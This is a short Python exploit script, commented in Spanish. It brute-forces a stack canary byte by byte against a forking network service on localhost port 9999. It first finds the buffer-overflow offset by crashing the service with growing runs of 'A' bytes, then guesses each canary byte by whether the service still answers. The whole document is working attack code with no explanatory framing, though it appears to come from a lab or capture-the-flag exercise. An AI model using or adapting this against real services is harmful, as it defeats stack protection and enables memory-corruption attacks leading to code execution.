#!/usr/bin/env python3
import struct
import socket
 
HOST = "127.0.0.1"
PORT = 9999
TIMEOUT = 1.5

def test_payload(payload):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(TIMEOUT)
		s.connect((HOST, PORT))
		s.send(payload)
		try:
			response = s.recv(1024)
			s.close()
			# Si recibimos respuesta ⇒ proceso sigue vivo ⇒ byte correcto
			if len(response) > 0:
				return True
			else:
				return False
		except socket.timeout:
			# No se recibió nada dentro del tiempo ⇒ probablemente se murió
			s.close()
			return False
	except Exception as e:
		print("[!] Error al conectar con el servidor")
		return False

def brute_canary(offset):
	canary = b"\x00"  # asumimos que el primer byte es \x00
	print("[*] Iniciando brute-force del canario...")
	print(f"[*] Byte 1 conocido:   {canary.hex()}")

	for i in range(1, 4):  # faltan 3 bytes
		for b in range(256):
			test_byte = canary + bytes([b])
			payload = b"A" * offset + test_byte
			if test_payload(payload):
				canary += bytes([b])
				print(f"[+] Byte {i+1} encontrado: {b:02x}")
				break

	print(f"[+] Canary encontrado: {hex(int.from_bytes(canary, "little"))} - {canary}")
	return canary

def find_offset(min_offset):
	offset = 0
	print(f"Se busca el offset con el canario a partir de {min_offset}")
	for n in range(min_offset, min_offset+3):
		payload = b'A' * n
		print(f"Se prueba con un offset de {n}")
		if not test_payload(payload) :
			offset = n - 1
			print(f"[OK] Se crashea con {n} - el offset es {offset}")
			break
	return offset

def find_canary(buffer_size):
	min_offset = buffer_size
	offset = find_offset(min_offset)
	canary = brute_canary(offset)
	return canary
    			
if __name__ == "__main__":
	try: 
		find_canary(64)
	except ValueError as e:
		print("Excepcion: {e}")
    	
